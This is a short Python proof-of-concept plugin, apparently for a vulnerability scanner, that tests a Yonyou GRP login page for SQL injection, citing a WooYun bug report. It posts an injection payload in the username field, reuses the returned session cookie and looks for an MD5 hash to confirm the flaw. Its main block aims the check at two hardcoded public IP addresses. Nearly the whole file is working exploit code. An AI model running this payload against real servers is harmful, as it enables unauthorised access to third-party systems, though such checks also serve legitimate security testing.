#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2015-0162385

import re

def assign(service, arg):
    if service == "yongyou_grp":
        return True, arg 	

def audit(arg):
    payload = '/login'
    url = arg + payload
    url_poc = arg + "/login.jsp"
    postpayload = "UserNameText=a')) AND 1=sys.fn_varbintohexstr(hashbytes('MD5','1234'))--&UserPassText=12&LoginType=NAME&submitAction=login"
    code, head, res, errcode, _ = curl.curl2(url, postpayload)
    if re.search('Set-Cookie: (.*?)\r\n', head):
        cookies = re.search('Set-Cookie: (.*?)\r\n', head).group(1)
        code, head, res, errcode, _ = curl.curl2(url_poc, cookie=cookies)
        if "81dc9bdb52d04dc20036dbd8313ed055" in res:
            security_hole(url + '   sql injection!')

if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_grp', 'http://61.139.105.105:8008')[1])
    audit(assign('yongyou_grp', 'http://125.67.66.249:801')[1])
